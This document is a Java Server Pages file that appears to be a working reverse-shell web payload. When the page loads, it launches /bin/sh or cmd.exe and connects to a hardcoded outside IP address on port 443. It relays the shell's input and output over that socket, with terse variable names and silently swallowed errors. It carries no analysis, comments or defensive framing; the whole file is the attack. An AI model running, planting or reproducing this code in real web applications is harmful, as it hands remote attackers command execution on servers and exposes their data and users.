<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream bq;
    OutputStream xt;

    StreamConnector( InputStream bq, OutputStream xt )
    {
      this.bq = bq;
      this.xt = xt;
    }

    public void run()
    {
      BufferedReader bh  = null;
      BufferedWriter dik = null;
      try
      {
        bh  = new BufferedReader( new InputStreamReader( this.bq ) );
        dik = new BufferedWriter( new OutputStreamWriter( this.xt ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bh.read( buffer, 0, buffer.length ) ) > 0 )
        {
          dik.write( buffer, 0, length );
          dik.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bh != null )
          bh.close();
        if( dik != null )
          dik.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "178.62.239.47", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
